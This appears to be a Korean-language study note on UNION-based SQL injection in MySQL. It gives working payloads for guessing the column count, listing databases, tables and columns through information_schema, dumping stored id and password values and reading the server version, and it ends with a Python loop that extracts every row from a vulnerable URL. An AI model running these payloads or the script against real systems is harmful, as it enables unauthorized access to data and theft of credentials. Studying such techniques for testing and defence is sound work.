# UNION Based sql injection 

__예시 mysql 환경__

```sql
database name -> user

table name -> UserDB

columns -> id, pw

mysql[user]>SELECT * FROM UserDB;

+-------+------------+
| id    | pw         |
+-------+------------+
| admin | passwd     |
| guest | aaa        |
| aaaaa | a          |
+-------+------------+

```

__예시 id 검색__

```sql
SELECT * FROM UserDB WHERE id='';
```


### UNION sql injection 이란?

데이터 베이스에 우리가 입력한 임의의 값으로 요청한다면 해당 임의의 값을 조작하여 UNION 연산자를 이용해 정보를 빼오는 기법이다.

__예시__

```sql
SELECT * FROM UserDB WHERE id='';
```

해당 sql query로 id Column에 값을 입력받는다면

UNION Sql injection 공격을 통해

```sql
SELECT * FROM UserDB WHERE id='' union select 1 --'';
```

이런식으로 union select (원하는 출력값) 이런 형식으로 요청을 하여 데이터 정보를 노출시킨다.

__UNION 연산자는 앞에 써져있는 쿼리의 컬럼 개수와 일정해야지 출력이 가능하다.__

만약에

```sql
SELECT id FROM UserDB id='' union select 1,2 --'';
```

union는 출력되는 컬럼 개수가 같아야지만 사용 가능하다.

하지만 위의 쿼리처럼 처음 select 에서는 id 즉 하나의 열만 출력하는데 
union select에서는 1,2를 출력하면서 2개의 행을 출력하게 되버린다.

근데 union 연산자는 행이 같아야지만 가능하기때문에 에러를 뱉을것이다.

위의 쿼리에서 union을 이용하기 위해서는

```sql
SELECT id FROM UserDB id='' union select 1 --''; 
```

이처럼 열의 개수에 따라 union 연산자를 만족시켜야된다.

* * *
<br>


### UNION Sql injection Columns Number

__union sql injection를 이용하여 컬럼 개수를 찾이 위해서는__

```sql
SELECT * FROM UserDB WHERE id='' union select 1 --'';

SELECT * FROM UserDB WHERE id='' union select 1,2 --'';

SELECT * FROM UserDB WHERE id='' union select 1,2,3 --'';

SELECT * FROM UserDB WHERE id='' union select 1,2,3,4 --'';

SELECT * FROM UserDB WHERE id='' union select 1,2,3,4,5 --'';

SELECT * FROM UserDB WHERE id='' union select 1,2,3,4,5,6 --'';
```

이처럼 무차별로 대입을 하여 해당 쿼리에서 출력할려는 컬럼 개수가 몇개있는지 유추함으로서 원하는 정보를 빼네올 수 있다.

* * *
<br>

### UNION Sql injection GET DATABASE Name

DATABASE 이름을 가져오기 위해서는

```sql
SELECT * FROM UserDB WHERE id='' UNION SELECT database(),2 --'';
```

이런식으로 database() 함수를 이용하여 데이터가 바로 노출시킬 수 있다.

하지만 해당 데이터베이스가아닌 모든 데이터베이스 이름을 빼오고 싶다면

```sql
SELECT * FROM UserDB WHERE id='' UNION SELECT (select DISTINCT table_schema from information_schema.tables limit 0,1),2 --'';
```

이처럼
 
```sql
select DISTINCT table_schema from information_schema.tables limit 0,1;
```
위의 키워드를 이용하여 모든 데이터베이스 이름을 뽑아올 수 있다.

만약에 위의 union sql injection가 성공했다면
limit 0,1 를

limit 1,1
limit 2,1
limit 3,1.... 이런식으로 무차별로 대입을 시킨 후 정보를 빼온다.

* * *
<br>

### UNION Sql injection GET TABLE Name

만약 자신이 원하는 데이터베이스의 테이블을 가져오고싶다면

```sql
SELECT * FROM UserDB WHERE id='' UNION SELECT (SELECT table_name FROM information_schema.tables WHERE table_schema='DATABASE NAME' limit 0,1),2 --'';
```

위처럼 DATABASE NAME 부분에 TABLE NAME을 얻고싶은 데이터베이스 이름을 넣으면 된다.

모든 테이블 이름을 얻고 싶다면 limit 0,1 을 

```sql
limit 1,1 
limit 2,1
limit 3,1
limit 4,1....
```

이런식으로 원하는 열의 테이블을 뽑아올 수 있다.

하지만 모든 테이블의 이름을 빼오고싶다면

```sql
(SELECT table_name FROM information_schema.tables WHERE table_schema='DATABASE NAME' limit 0,1)
에서 where 를 제거하여
(SELECT table_name FROM information_schema.tables limit 0,1)
```
이런식으로 모든 테이블 뽑아오는것이 가능하다.

* * *
<br>

### UNION Sql injection GET Columns Name

만약 자신이 원하는 테이블의 컬럼을 가져오고싶다면

```sql
SELECT * FROM UserDB WHERE id='' UNION SELECT (SELECT column_name FROM information_schema.columns WHERE table_name='table name' limit 0,1),2 --'';
```

위처럼 table name에 자신이 원하는 테이블의 컬럼을 하나씩 뽑아올 수 있다.

만약 모든 컬럼을 뽑아오고싶다면

```sql
SELECT * FROM UserDB WHERE id='' UNION SELECT (SELECT column_name FROM information_schema.columns limit 0,1),2 --'';
```

WHERE 만 없어주면은 가능하다.

* * *

<br>

### UNION Sql injection GET Columns Deta

자신이 원하는 테이블의 데이터를 빼오기 위해서는 사전에

테이블 이름과 컬럼 이름 정보가 필요하다 해당 정보를 얻는법은 위에있으니 참고하면 된다.

만약에 테이블 , 컬럼 이름을 알고있다면

```sql
SELECT * FROM UserDB WHERE id='' UNION SELECT (SELECT id FROM UserDB limit 0,1),(SELECT pw FROM UserDB limit 0,1) --'';
```

이런식으로 () 안에 자신이 원하는 테이블의 데이터를 뽑아 정보를 탈취할 수 있다.

* * *
<br>

### UNION Sql injection GET Version

데이터베이스의 버전 정보를 얻기위해서는 아주 간단하다.

version() 또는 @@version 를 이용하면 가능하다.

예로

```sql
SELECT * FROM UserDB WHERE id='' UNION SELECT @@version,2 --'';
SELECT * FROM UserDB WHERE id='' UNION SELECT version(),2 --'';
```

이처럼 자신이 사용하고있는 데이터베이스의 버전을 쉽게 탈취할 수 있다.

* * *
<br>

### UNION Sql injection python script

만약에 union sql injection를 이용하더라도 모든 데이터를 뽑아오고 싶을 경우에는

예로 게시판에 자신이 원하는 union sql injection 를 이용하여 데이터를 노출시킬 수 있다면

python 으로 간단하게 가능하다.

```py
import requests
for i in range(1,100):
    r = requests.get(url = f"url?id='' UNION SELECT (SELECT id FROM UserDB limit {i},1),(SELECT pw FROM UserDB limit {i},1)")
    print(r.text)
```

이런식으로 limit n,n 을 이용하셔 for 를 돌리면서 1씩 늘리고 자신이 원하는 모든 데이터를 뽑아올 수 있다.

테이블 , 컬럼 , 데이터베이스는 위의 python 스크립트에서 select id from userdb 부분만 자신이 원하는 구문으로 바꾸면 된다.


### 마무리

union SQL injection 기법은

다른 SQL injection 기법중 정보를 가져오기 제일 수월한 기법이다.